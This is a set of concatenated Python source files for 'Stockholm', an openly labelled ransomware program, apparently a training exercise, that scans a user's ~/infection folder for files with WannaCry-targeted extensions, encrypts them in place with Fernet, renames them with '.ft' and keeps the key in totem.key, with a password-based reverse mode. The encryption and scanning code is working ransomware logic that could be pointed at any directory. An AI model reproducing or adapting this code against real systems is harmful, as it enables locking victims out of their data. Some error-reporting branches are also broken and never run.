import argparse
from scanner import scan_encrypt, scan_decrypt
from encryptor import encrypt_dirs
from decryptor import decrypt_dirs
from getpass import getuser

# Target default directory
user_target = getuser()
user_dir = '/home/'+user_target
default_dir = '/home/'+user_target+'/infection'

# Main
def run():
    # Charge flags config
    args = config_args()
    ## Encrypt directory - forced to default_dir
    if args.reverse == None and args.version == False:
        res_encrypt = scan_encrypt(dir=default_dir,silent=args.silent)
        if len(res_encrypt) > 0:
            encrypt_dirs(lst_dir=res_encrypt,silent=args.silent)
    ## Decrypt directory - forced to default_dir
    if args.reverse != None and args.version == False:
        re_decrypt = scan_decrypt(dir=default_dir,silent=args.silent)
        if len(re_decrypt) > 0:
            decrypt_dirs(key=args.reverse,lst_dir=re_decrypt,silent=args.silent)
    ## Print version program
    if args.version == True:
        print("Program version Stockholm-1.1 - lgomes-o")

# Flags configurations
def config_args():
    parser = argparse.ArgumentParser(
        description= """*** STOCKHOLM RANSOMWARE ***\n
        Encrypt and decrypt multiple files and directories.
        *** WARNING: This program was written for educational purposes.  
        The responsibility for the use and distribution of the tool lies with 
        the user. Use it at your own risk and enjoy! goldcod3-[Don't lose the totem]"""
    )
    # Reverse mode
    parser.add_argument("-r","--reverse",default=None,help="[-r + PASSWORD] Reverse File Encryption.")
    # Silent mode
    parser.add_argument("-s","--silent",default=False,action='store_true',help="Silent mode, the program output is emitted.")
    # Version mode
    parser.add_argument("-v","--version",default=False,action='store_true',help="Print program version.")
    return parser.parse_args()

# Main execution
if __name__ == "__main__":
    run()
    
    
    
    
    
    
    
from cryptography.fernet import Fernet
from os import rename
from os.path import splitext
from print_action import print_decryption, print_decrypt_file

# Function for decrypt a directory
def decrypt_dirs(key=None,lst_dir=[],silent=False):
    print_decryption(silent)
    if len(lst_dir) > 0 and key != None:
        for index_dir in lst_dir:
                for lst_files,dir in index_dir.items():
                    if len(dir) > 0:
                        for file in index_dir[lst_files]:
                            status = decrypt_file(file=file,key=key,silent=silent)
                            print_decrypt_file(result=status,file=file,silent=silent)
                    else:
                        if silent == False:
                            print("""[X] {}
                            NO FILES TO DECRYPT -- ENCRYPTION DISABLED!!""".format(lst_files))
        if silent == False:
            print("*** STOPING STOCKHOLM ***")

# Function for decrypt a file
def decrypt_file(file,key,silent=False):
    try:
        # Module Fernet to decrypt
        fern = Fernet(key)
        with open(file,"rb") as target_r: 
            encrypted_data = target_r.read()
        # Data decrypted from file
        decrypt_data = fern.decrypt(encrypted_data)
        # Write decrypted data on file
        with open(file,"wb") as target_w:
            target_w.write(decrypt_data)
        # Rename the file
        name,ext = splitext(file)
        if ext == ".ft":
            rename(file,name)
        return True
    except Exception:
        return False
    
    
    
    
    from cryptography.fernet import Fernet
from os import rename
from os.path import splitext
from print_action import print_encryption, print_encrypt_file

# Funcion que genera el totem [pass]
def keygen():
    key = Fernet.generate_key()
    with open("totem.key","wb") as totem:
        totem.write(key)

#Funcion que lee el valor del totem
def getkey():
    try:
        keyfile = open("totem.key","rb").read()
        return keyfile    
    except:
        return None

# Function for encrypt a directory
def encrypt_dirs(lst_dir=[],silent=False):
    if len(lst_dir) > 0:
        # Verification of key
        while getkey() == None:
                keygen()
        print_encryption(silent)
        key = getkey()
        for index_dir in lst_dir:
                for lst_files,dir in index_dir.items():
                    if len(dir) > 0:
                        for file in index_dir[lst_files]:
                            res = encrypt_file(file=file,key=key,silent=silent)
                            print_encrypt_file(result=res,file=file,silent=silent)
                    else:
                        if silent == False:
                            print("""[X] {}
                            NO FILES TO ENCRYPT -- ENCRYPTION DISABLED!!"""
                            .format(lst_files))
        if silent == False:
            print("*** STOPING STOCKHOLM ***")

# Function for encrypt a file
def encrypt_file(file, key, silent=False):
    try:
        # Module Fernet to encrypt
        fern = Fernet(key)
        with open(file,"rb") as target_r:
            target_data = target_r.read()
        # Data encrypted from file
        data_encrypt = fern.encrypt(target_data)
        # Write encrypted data on file
        with open(file, "wb") as target_w:
            target_w.write(data_encrypt)
        # Rename the file
        name,ext = splitext(file)
        if ext != '.ft':
            rename(file,file+'.ft')
        del(name)
        return True
    except Exception:
        return False






from time import sleep
from os import system

banner = """
        ################################################################################
        ################################################################################
        #   ;;;;; ;;;;;;;  ;;;;    ;;;;;  ;;;  ;;; ;;;  ;;;   ;;;;   ;;;    ;;;;  ;;;; #
        #  ;;;;;; ;;;;;;; ;;;;;;  ;;;;;;; ;;; ;;;  ;;;  ;;;  ;;;;;;  ;;;    ;;;;  ;;;; #
        # ;;;       ;;;  ;;;  ;;; ;;; ;;; ;;; ;;;  ;;;  ;;; ;;;  ;;; ;;;    ;;;;  ;;;; #
        #  ;;;;;    ;;;  ;;;  ;;; ;;;     ;;;;;;   ;;;;;;;; ;;;  ;;; ;;;    ;; ;;;;;;; #
        #  ;;;;;;;  ;;;  ;;;  ;;; ;;;     ;;;;;;   ;;;;;;;; ;;;  ;;; ;;;    ;; ;;;; ;; #
        #     ;;;;  ;;;  ;;;  ;;; ;;; ;;; ;;;;;;;  ;;;  ;;; ;;;  ;;; ;;;    ;; ;;;; ;; #
        # ;;;  ;;;  ;;;  ;;;  ;;; ;;;;;;; ;;; ;;;  ;;;  ;;; ;;;  ;;; ;;;;;; ;; ;;;; ;; #
        #  ;;;;;;   ;;;   ;;;;;;   ;;;;;  ;;;  ;;; ;;;  ;;;  ;;;;;;  ;;;;;; ;; ;;;; ;; #
        #   ;;;;    ;;;    ;;;;     ;;;   ;;;  ;;; ;;;  ;;;   ;;;;   ;;;;;; ;;  ;;  ;; #
        ################################################################################
        ################################################################################
                                                                    github.com/goldcod3"""

# Funcion Verbose - Salida por consola
def print_scan(lst_dirs=None, lst_error=None):
    system('clear')
    print(banner)
    sleep(2)
    system('clear')
    print("""
        **************************************
        *|         SCANNING FILES!!!        |*
        **************************************\n""")
    sleep(0.5)
    print("""*** SCANNING RESULT ***
    """)
    num_files = 0
    num_directories = 0
    num_error = 0
    for dir in lst_dirs:
        num_directories = num_directories+1
        for d,file in dir.items():
            sleep(0.2)
            print("* DIRECTORY AFFECTED --> {}".format(d))
            for f in file:
                num_files = num_files+1  
                sleep(0.2)
                print("[*]-- FILE AFFECTED   --> {:>35}".format(f.replace(d+'/',"")))
        print()
    for file in lst_error:
                print("[X]-- ERROR FILE - NO AFECTED   --> {:>35}".format(file))
                num_error = num_error+1
                sleep(0.2)
    print()
    print("""-_- DIRECTORIES AFFECTED -_-
    {}""".format(num_directories))
    print("""-*- FILES AFFECTED -*-
    {}""".format(num_files))
    print("""-X- ERROR FILES - NO AFFECTED -*-
    {}""".format(num_error))
    sleep(4)
    system('clear')

# Function was printing encryption action
def print_encryption(silent=False):
    if silent == False:
        print("""
            **************************************
            *|     CHECKING KEY TO INFECT!!!    |*
            **************************************\n""")
        sleep(0.5)
        print("*** KEY CHECKED ***")
        sleep(2)
        system('clear')
        print("""
            **************************************
            *|      STARTING ENCRYPTION!!!      |*
            **************************************\n""")
        sleep(0.5)
        print("*** ENCRYPTING FILES ***")
        sleep(2)

# Function was printing decryption action
def print_decryption(silent=False):
    if silent == False:
        system('clear')
        print("""
            **************************************
            *|      STARTING DECRYPTION!!!      |*
            **************************************\n""")
        sleep(0.5)
        print("*** DECRYPTING FILES ***")
        sleep(2)

# Print result of encription file
def print_encrypt_file(result=False, file=None, silent=False):
    if result == True and silent == False:
        print("""[$] -> FILE ENCRYPTED 
        {:>35}""".format(file.replace('.ft',"")+'.ft', end=""))
        sleep(0.2)
    elif result == True and silent == False:
        print("""[X] -> ERROR ENCRYPT 
        {:>35}\n""".format(file), end="")
        sleep(0.2)

# Print result of decription file
def print_decrypt_file(result=False, file=None, silent=False):
    if result == True and silent == False:
        print("""[$] -> FILE DECRYPTED 
        {:>35}""".format(file.replace('.ft',""), end=""))
        sleep(0.2)
    elif result == True and silent == False:
        print("""[X] -> ERROR DECRYPT 
        {:>35}\n""".format(file), end="")
        sleep(0.2)
        
        
        
        
        
from os import listdir
from os.path import isdir, isfile, splitext
from time import sleep
from print_action import print_scan

# Dictionary of extensions affected for Wannacry
src_dic = set()
# References of files to encrypt, decrypt and error files and directories
encrypt_dir = []
decrypt_dir = []
error_files = []

# Function of charge dictionary for 'src_dic'
def get_dictionary(silent=False):
    try:
        with open("dic_wcry.txt","r") as dic_wcry:
            for ext in dic_wcry:
                src_dic.add(ext.replace('\n',""))
        return True
    except:
        if silent == False:
            print("ERROR READ DICTIONARY!")
        return False

# Function of charge directories and subdirectories to encrypt
def scan_encrypt_dirs(dir=None, silent=False):
    try:
        files = []
        # Scan directories
        for obj in listdir(dir):
            if isfile(dir+'/'+obj):
                # Verification of extension
                name, ext = splitext(dir+'/'+obj)
                if ext in src_dic: 
                    files.append(dir+'/'+obj)
                else:
                    error_files.append(dir+'/'+obj)
        directory = {dir:files}
        encrypt_dir.append(directory)
        # Scan subdirectories
        for obj in listdir(dir):
            if isdir(dir+'/'+obj):
                scan_encrypt_dirs(dir+'/'+obj)
    except Exception:
        if silent == False:
            print("ERROR READ DIRECTORY -> {}".format(dir))
            sleep(0.2)

# Function of charge directories and subdirectories to decrypt
def scan_decrypt_dirs(dir=None,silent=False):
    try:
        files = []
        # Scan directories
        for obj in listdir(dir):
            if isfile(dir+"/"+obj):
                # Verification of extension
                file,ext = splitext(obj)
                if ext == '.ft':
                    name,o_ext = splitext(obj[:-3])
                    if o_ext in src_dic:
                        files.append(dir+'/'+obj)
                    else:
                        error_files.append(dir+"/"+obj)
                else:
                    error_files.append(dir+"/"+obj)
        directory = {dir:files}
        decrypt_dir.append(directory)
        # Scan subdirectories
        for obj in listdir(dir):
            if isdir(dir+'/'+obj):
                scan_decrypt_dirs(dir+'/'+obj)
    except Exception:
        if silent == False:
            print("ERROR READ DIRECTORY -> {}".format(dir))
            sleep(0.2)

# Function for scan directories to encrypt
def scan_encrypt(dir=None,silent=False):
    # Check dictionary Wannacry
    if get_dictionary(silent=silent):
        # Scan directories to encrypt
        scan_encrypt_dirs(dir=dir,silent=silent)
        if silent == False:
            print_scan(lst_dirs=encrypt_dir,lst_error=error_files)
        return encrypt_dir

# Function for scan directories to decrypt
def scan_decrypt(dir=None,silent=False):
    # Check dictionary Wannacry
    if get_dictionary(silent=silent):
        # Scan directories to decrypt
        scan_decrypt_dirs(dir=dir,silent=silent)
        if silent == False:
                print_scan(lst_dirs=decrypt_dir,lst_error=error_files)
        return decrypt_dir